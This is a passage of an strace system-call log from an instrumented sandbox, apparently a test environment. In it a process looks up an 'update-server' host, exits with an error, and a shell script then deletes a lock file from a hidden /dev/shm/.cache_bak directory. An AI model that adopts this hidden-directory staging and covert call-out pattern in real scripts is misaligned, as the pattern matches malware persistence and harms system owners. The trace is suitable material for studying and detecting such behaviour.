25    14:56:49.794412 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    14:56:49.794694 poll([{fd=5<pipe:[613]>, events=POLLIN}, {fd=3<pipe:[611]>, events=POLLIN}], 2, 1 <unfinished ...>
25    14:56:49.794972 <... rt_sigprocmask resumed>NULL, 8) = 0
25    14:56:49.795227 mmap(NULL, 134217728, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b39e603000
25    14:56:49.795781 munmap(0x74b39e603000, 27250688) = 0
24    14:56:49.796271 <... poll resumed>) = 0 (Timeout)
25    14:56:49.796493 munmap(0x74b3a4000000, 39858176 <unfinished ...>
24    14:56:49.796690 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    14:56:49.796912 <... munmap resumed>) = 0
24    14:56:49.797156 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
25    14:56:49.797465 mprotect(0x74b3a0000000, 135168, PROT_READ|PROT_WRITE <unfinished ...>
24    14:56:49.797687 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.797901 <... mprotect resumed>) = 0
24    14:56:49.798108 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.798333 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0 <unfinished ...>
24    14:56:49.798533 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.798792 <... socket resumed>) = 7<socket:[614]>
24    14:56:49.799055 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.799258 connect(7<socket:[614]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110 <unfinished ...>
24    14:56:49.799476 poll([{fd=5<pipe:[613]>, events=POLLIN}, {fd=3<pipe:[611]>, events=POLLIN}], 2, 2 <unfinished ...>
25    14:56:49.799674 <... connect resumed>) = -1 ENOENT (No such file or directory)
25    14:56:49.799871 close(7<socket:[614]>) = 0
25    14:56:49.800295 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7<socket:[615]>
25    14:56:49.800763 connect(7<socket:[615]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
25    14:56:49.801260 close(7<socket:[615]>) = 0
25    14:56:49.801676 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf",  <unfinished ...>
24    14:56:49.801879 <... poll resumed>) = 0 (Timeout)
25    14:56:49.802053 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
24    14:56:49.802252 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    14:56:49.802438 newfstatat(AT_FDCWD</sandbox>, "/etc/resolv.conf",  <unfinished ...>
24    14:56:49.802648 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
25    14:56:49.802833 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=312, ...}, 0) = 0
24    14:56:49.803011 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.803194 openat(AT_FDCWD</sandbox>, "/etc/host.conf", O_RDONLY|O_CLOEXEC <unfinished ...>
24    14:56:49.803379 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.803559 <... openat resumed>) = 7</etc/host.conf>
24    14:56:49.803746 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.803924 fstat(7</etc/host.conf>,  <unfinished ...>
24    14:56:49.804106 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.804289 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=92, ...}) = 0
24    14:56:49.804475 poll([{fd=5<pipe:[613]>, events=POLLIN}, {fd=3<pipe:[611]>, events=POLLIN}], 2, 4 <unfinished ...>
25    14:56:49.804656 read(7</etc/host.conf>, "# The \"order\" line is only used "..., 4096) = 92
25    14:56:49.805036 read(7</etc/host.conf>, "", 4096) = 0
25    14:56:49.805500 close(7</etc/host.conf>) = 0
25    14:56:49.805966 futex(0x74b3a804666c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
25    14:56:49.806375 openat(AT_FDCWD</sandbox>, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 7</etc/resolv.conf>
25    14:56:49.806863 fstat(7</etc/resolv.conf>, {st_mode=S_IFREG|0644, st_size=312, ...}) = 0
25    14:56:49.807406 read(7</etc/resolv.conf>, "# Generated by Docker Engine.\n# "..., 4096) = 312
25    14:56:49.807916 read(7</etc/resolv.conf>, "", 4096) = 0
25    14:56:49.808466 uname({sysname="Linux", nodename="97c4bc2edabd", ...}) = 0
24    14:56:49.808963 <... poll resumed>) = 0 (Timeout)
25    14:56:49.809143 fstat(7</etc/resolv.conf>,  <unfinished ...>
24    14:56:49.809339 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    14:56:49.809510 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=312, ...}) = 0
24    14:56:49.809678 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
25    14:56:49.809838 close(7</etc/resolv.conf> <unfinished ...>
24    14:56:49.809975 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.810111 <... close resumed>) = 0
24    14:56:49.810252 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.810409 openat(AT_FDCWD</sandbox>, "/etc/hosts", O_RDONLY|O_CLOEXEC <unfinished ...>
24    14:56:49.810581 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.810750 <... openat resumed>) = 7</etc/hosts>
24    14:56:49.810913 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.811065 fstat(7</etc/hosts>,  <unfinished ...>
24    14:56:49.811213 poll([{fd=5<pipe:[613]>, events=POLLIN}, {fd=3<pipe:[611]>, events=POLLIN}], 2, 8 <unfinished ...>
25    14:56:49.811411 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=172, ...}) = 0
25    14:56:49.811643 lseek(7</etc/hosts>, 0, SEEK_SET) = 0
25    14:56:49.812013 read(7</etc/hosts>, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 172
25    14:56:49.812362 read(7</etc/hosts>, "", 4096) = 0
25    14:56:49.812674 close(7</etc/hosts>) = 0
25    14:56:49.813055 socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 7<socket:[4668]>
25    14:56:49.813498 setsockopt(7<socket:[4668]>, SOL_IP, IP_RECVERR, [1], 4) = 0
25    14:56:49.813914 connect(7<socket:[4668]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
25    14:56:49.814324 poll([{fd=7<socket:[4668]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
25    14:56:49.814697 sendmmsg(7<socket:[4668]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\356-\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="s#\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}], 2, MSG_NOSIGNAL) = 2
25    14:56:49.815195 poll([{fd=7<socket:[4668]>, events=POLLIN}], 1, 5000) = 1 ([{fd=7, revents=POLLIN}])
25    14:56:49.815571 ioctl(7<socket:[4668]>, FIONREAD, [49]) = 0
25    14:56:49.815932 recvfrom(7<socket:[4668]>, "s#\201\2\0\1\0\0\0\0\0\0\31update-server-place"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 49
25    14:56:49.816314 poll([{fd=7<socket:[4668]>, events=POLLIN}], 1, 4998) = 1 ([{fd=7, revents=POLLIN}])
25    14:56:49.816678 ioctl(7<socket:[4668]>, FIONREAD, [49]) = 0
25    14:56:49.817089 recvfrom(7<socket:[4668]>, "\356-\201\2\0\1\0\0\0\0\0\0\31update-server-place"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 49
25    14:56:49.817476 poll([{fd=7<socket:[4668]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
25    14:56:49.817808 sendmmsg(7<socket:[4668]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\356-\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="s#\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}], 2, MSG_NOSIGNAL) = 2
25    14:56:49.818224 poll([{fd=7<socket:[4668]>, events=POLLIN}], 1, 5000) = 1 ([{fd=7, revents=POLLIN}])
25    14:56:49.818558 ioctl(7<socket:[4668]>, FIONREAD, [49]) = 0
25    14:56:49.818926 recvfrom(7<socket:[4668]>, "s#\201\2\0\1\0\0\0\0\0\0\31update-server-place"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 49
25    14:56:49.819267 poll([{fd=7<socket:[4668]>, events=POLLIN}], 1, 4998) = 1 ([{fd=7, revents=POLLIN}])
24    14:56:49.819555 <... poll resumed>) = 0 (Timeout)
25    14:56:49.819682 recvfrom(7<socket:[4668]>,  <unfinished ...>
24    14:56:49.819820 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    14:56:49.819953 <... recvfrom resumed>"\356-\201\2\0\1\0\0\0\0\0\0\31update-server-place"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]) = 49
24    14:56:49.820095 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
25    14:56:49.820226 close(7<socket:[4668]> <unfinished ...>
24    14:56:49.820357 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.820502 <... close resumed>) = 0
24    14:56:49.820626 <... rt_sigaction resumed>NULL, 8) = 0
25    14:56:49.820767 write(6<pipe:[613]>, "\1", 1 <unfinished ...>
24    14:56:49.820915 futex(0x58b33a093ac0, FUTEX_WAIT_PRIVATE, 2, NULL <unfinished ...>
25    14:56:49.821043 <... write resumed>) = 1
25    14:56:49.821205 futex(0x58b33a093ac0, FUTEX_WAKE_PRIVATE, 1) = 1
24    14:56:49.821517 <... futex resumed>) = 0
25    14:56:49.821673 rt_sigprocmask(SIG_BLOCK, ~[RT_1],  <unfinished ...>
24    14:56:49.821833 futex(0x58b33a093ac0, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
25    14:56:49.821982 <... rt_sigprocmask resumed>NULL, 8) = 0
24    14:56:49.822157 <... futex resumed>) = 0
25    14:56:49.822317 madvise(0x74b3a6603000, 8368128, MADV_DONTNEED <unfinished ...>
24    14:56:49.822498 futex(0x74b3a6e03990, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, 25, NULL, FUTEX_BITSET_MATCH_ANY <unfinished ...>
25    14:56:49.822663 <... madvise resumed>) = 0
25    14:56:49.822848 exit(0)           = ?
24    14:56:49.823186 <... futex resumed>) = 0
25    14:56:49.823361 +++ exited with 0 +++
24    14:56:49.823523 close(6<pipe:[613]>) = 0
24    14:56:49.823927 close(5<pipe:[613]>) = 0
24    14:56:49.824588 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.825046 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.825509 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.825954 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.826363 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.826802 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.827256 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.827637 close(3<pipe:[611]>) = 0
24    14:56:49.828052 close(4<pipe:[611]>) = 0
24    14:56:49.828451 brk(0x58b33a0b8000) = 0x58b33a0b8000
24    14:56:49.828814 brk(0x58b33a0b6000) = 0x58b33a0b6000
24    14:56:49.829161 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.829559 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.829936 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.830286 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.830686 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.831078 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.831453 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.831842 brk(0x58b33a0b4000) = 0x58b33a0b4000
24    14:56:49.832478 exit_group(6)     = ?
24    14:56:49.833940 +++ exited with 6 +++
9     14:56:49.834104 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 6}], 0, NULL) = 24
9     14:56:49.834314 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.834719 ioctl(2<pipe:[2810]>, TIOCGWINSZ, 0x7fff19398f90) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:49.835159 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.835557 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=24, si_uid=1001, si_status=6, si_utime=0, si_stime=1 /* 0.01 s */} ---
9     14:56:49.835758 wait4(-1, 0x7fff19398910, WNOHANG, NULL) = 0
9     14:56:49.836107 rt_sigreturn({mask=[]}) = 0
9     14:56:49.836464 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.836854 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.837255 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.837612 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.837962 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.838315 read(0<pipe:[589]>, "#", 1) = 1
9     14:56:49.838695 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.839072 read(0<pipe:[589]>, "C", 1) = 1
9     14:56:49.839442 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.839789 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.840144 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.840489 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.840919 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.841468 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.841919 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.842370 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.842764 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.843143 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.843527 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.843882 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.844239 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.844641 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.844999 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.845348 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.845754 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.846139 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.846492 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.846896 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.847251 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.847620 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.847976 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.848327 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.848673 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.849015 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.849373 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.849720 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.850073 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.850428 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.850793 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.851138 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.851481 read(0<pipe:[589]>, "_", 1) = 1
9     14:56:49.851818 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.852159 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.852501 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.852839 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.853182 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.853522 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.853862 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.854211 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.854553 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.854961 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.855304 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.855663 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.856049 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.856394 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.856740 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.857121 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.857814 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:49.858368 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/rm", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.858890 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/rm", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.859337 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/rm", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.859715 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     14:56:49.860166 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     14:56:49.860557 geteuid()         = 1001
9     14:56:49.860893 getegid()         = 1001
9     14:56:49.861235 getuid()          = 1001
9     14:56:49.861573 getgid()          = 1001
9     14:56:49.861931 access("/usr/bin/rm", X_OK) = 0
9     14:56:49.862303 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     14:56:49.862746 geteuid()         = 1001
9     14:56:49.863089 getegid()         = 1001
9     14:56:49.863420 getuid()          = 1001
9     14:56:49.863749 getgid()          = 1001
9     14:56:49.864099 access("/usr/bin/rm", R_OK) = 0
9     14:56:49.864448 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.864791 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.865165 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 26
9     14:56:49.865741 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
26    14:56:49.865884 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.866021 <... rt_sigprocmask resumed>NULL, 8) = 0
26    14:56:49.866160 <... set_robust_list resumed>) = 0
9     14:56:49.866315 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
26    14:56:49.866464 getpid( <unfinished ...>
9     14:56:49.866616 <... rt_sigprocmask resumed>[], 8) = 0
26    14:56:49.866780 <... getpid resumed>) = 26
9     14:56:49.866928 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
26    14:56:49.867081 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.867238 <... rt_sigprocmask resumed>NULL, 8) = 0
26    14:56:49.867370 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.867495 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
26    14:56:49.867634 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.867786 <... rt_sigprocmask resumed>[], 8) = 0
26    14:56:49.867928 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.868070 rt_sigaction(SIGINT, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
26    14:56:49.868226 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.868385 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
26    14:56:49.868528 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.868698 wait4(-1,  <unfinished ...>
26    14:56:49.868837 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
26    14:56:49.869200 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
26    14:56:49.869541 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
26    14:56:49.869872 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
26    14:56:49.870240 execve("/usr/bin/rm", ["rm", "-f", "/dev/shm/.cache_bak/update.lock"], 0x63f037b0d640 /* 9 vars */) = 0
26    14:56:49.871046 brk(NULL)         = 0x55ae3e7b2000
26    14:56:49.871460 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7b3f2c7000
26    14:56:49.871822 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
26    14:56:49.872517 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
26    14:56:49.872985 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
26    14:56:49.873514 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7f7b3f2c2000
26    14:56:49.873859 mmap(0x7f7b3f2c3000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7f7b3f2c3000
26    14:56:49.874299 mmap(0x7f7b3f2c4000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7f7b3f2c4000
26    14:56:49.874800 mmap(0x7f7b3f2c5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7f7b3f2c5000
26    14:56:49.875271 close(3</usr/lib/libfake_tracer.so>) = 0
26    14:56:49.875680 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
26    14:56:49.876074 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
26    14:56:49.876442 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
26    14:56:49.876771 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7f7b3f2c0000
26    14:56:49.877134 close(3</etc/ld.so.cache>) = 0
26    14:56:49.877461 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
26    14:56:49.877802 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
26    14:56:49.878121 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
26    14:56:49.878434 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
